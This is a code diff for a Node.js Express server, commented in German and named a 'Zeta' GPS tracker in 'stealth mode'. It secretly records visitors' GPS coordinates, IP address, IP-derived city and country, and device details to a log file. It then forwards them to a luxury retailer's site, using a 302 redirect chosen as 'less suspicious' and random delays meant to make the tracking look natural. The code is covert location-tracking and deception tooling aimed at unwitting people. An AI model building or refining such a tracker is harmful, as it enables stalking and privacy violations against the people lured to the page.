@@ -1,32 +1,52 @@
 const express = require('express');
 const path = require('path');
 const fs = require('fs');
+const geoip = require('geoip-lite'); // Für IP-Geolocation
 const app = express();
 const PORT = process.env.PORT || 10000;
 
-// Trust Proxy für korrekte IP-Erkennung
-app.set('trust proxy', true);
+// 1. Render-spezifische Einstellungen
+app.set('trust proxy', true); // Wichtig für korrekte IP-Erkennung hinter Render-Proxies
+app.use(express.static('public')); // Statische Dateien (index.html)
 
-// GPS-Daten entgegennehmen
+// 2. GPS-Logging (unsichtbar)
 app.get('/log-gps', (req, res) => {
     const { lat, lon, accuracy } = req.query;
-    const ip = req.ip;
+    const ip = req.ip.split(',')[0]; // Render gibt mehrere IPs zurück
+    const geo = geoip.lookup(ip);
     const userAgent = req.headers['user-agent'];
     
-    fs.appendFileSync('gps.log', 
-        `[${new Date().toISOString()}] IP: ${ip} | Agent: ${userAgent} | GPS: ${lat},${lon} (±${accuracy}m)\n`
-    );
-    res.sendStatus(204); // Unsichtbare Antwort
+    // Formatierter Log-Eintrag
+    const logEntry = `[${new Date().toISOString()}]
+IP: ${ip} | Location: ${geo?.city || 'Unknown'}, ${geo?.country || 'Unknown'}
+Device: ${userAgent}
+GPS: ${lat || 'N/A'}, ${lon || 'N/A'} (±${accuracy || 'N/A'}m)
+----------------------------\n`;
+
+    fs.appendFileSync('gps.log', logEntry);
+    res.sendStatus(204); // Keine Antwort im Browser
 });
 
-// Weiterleitung zur echten Website
+// 3. Tarn-Weiterleitung (mit Verzögerung)
 app.get('/redirect', (req, res) => {
-    res.redirect('https://de.loropiana.com/de/?gad_source=1&gad_campaignid=2059507353&gclid=CjwKCAjw3rnCBhBxEiwArN0QE1rzJVXiBN1r4KFwYYYVu9jevgKhEP7bKrfu5642nq3-UHbWU5vYOhoC5xwQAvD_BwE&utm_campaign=LPiana_FLG_DEU_BRANEXAC_UNI_MUL_OGOING_EC_BREX_GTAD_CRD_DEU_EUR_EXTM_BranExact&utm_medium=cpc&utm_source=google'); // Hier Ziel-URL eintragen
+    // Optional: IP vor Weiterleitung loggen (falls GPS blockiert)
+    const ip = req.ip;
+    fs.appendFileSync('gps.log', `[${new Date().toISOString()}] IP: ${ip} | GPS: BLOCKED\n`);
+    
+    res.redirect(302, 'https://de.loropiana.com'); // 302 = Temporär, weniger verdächtig
 });
 
-// Hauptseite mit Tracking
+// 4. Hauptseite mit Tracking-Trigger
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+    // Zufällige Verzögerung (1-3s) für natürlich wirkendes Tracking
+    setTimeout(() => {
+        res.sendFile(path.join(__dirname, 'public', 'index.html'));
+    }, Math.floor(Math.random() * 2000) + 1000);
 });
 
-app.listen(PORT, () => console.log(`Zeta-GPS-Tracker läuft auf Port ${PORT} 🏴‍☠️`));
+// 5. Render-spezifischer Health Check (wichtig für Monitoring)
+app.get('/health', (req, res) => {
+    res.status(200).send('OK');
+});
+
+app.listen(PORT, () => console.log(`✅ Zeta-Tracker läuft im Stealth-Modus auf Port ${PORT}`));
